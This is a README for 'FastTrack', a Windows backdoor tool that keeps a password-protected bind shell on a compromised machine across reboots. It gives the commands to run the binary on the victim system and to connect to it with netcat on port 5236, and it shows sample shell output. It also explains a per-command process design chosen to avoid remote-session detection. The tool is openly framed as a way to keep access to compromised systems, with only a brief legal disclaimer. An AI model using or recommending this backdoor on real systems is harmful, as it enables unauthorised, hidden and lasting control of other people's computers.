<img width="500" alt="FastTrack Logo" src="https://github.com/user-attachments/assets/353e377c-c0f2-4e9e-92bf-eba8c46399c0" />


# ℹ️ Quick Start - How to use

Looking to setup a simple persistent access to a system you compromised? With **FastTrack** it is possible to setup a perpetual bind shell protected by password.

All that is needed, is to upload the `FastTrack.exe` binary, run it, and the special access is reachable with a simple netcat port connection.

### ➡️ Running FastTrack (Compromised System)
```
C:\Users\Offsec> FastTrack.exe
```
Yeah that's it, you're all set, including after reboots.

### ↔️ Connecting to FastTrack from Kali (or whatever)
```
$ nc <target ip> 5236
...
<type in the password>
...
######################################
##  ->] FastTrack Windows Backdoor  ##
######################################

FastTrack v1.0 (C) 2025 by Luigi Fiore (https://lypd0.com).
Built for legal purposes and authorized contexts only.

->] C:\Users\Offsec>
```
The default port for the release build is 5236. It can easily be modified from the source, and I will probably make it possible to choose it on startup.

### ❔ Things you should know
- Connection drops? You can re-connect. The bind shell is always active.
- The shell will not reply to anything when connected initially. You must insert the password and press enter. If the connection drops, the password is invalid.
- The traffic is NOT encrypted. Do not transfer sensitive information.
- FastTrack doesn't work like a default bind shell, there is no persistent cmd process with STDIN and STDOUT redirected through a socket to avoid remote select terminal session detections. Each command creates a standalone cmd process which dies after execution. It's a trade-off, but if you don't like it, don't use it.
- Maintenance is not planned, it's just a tool I made for fun.

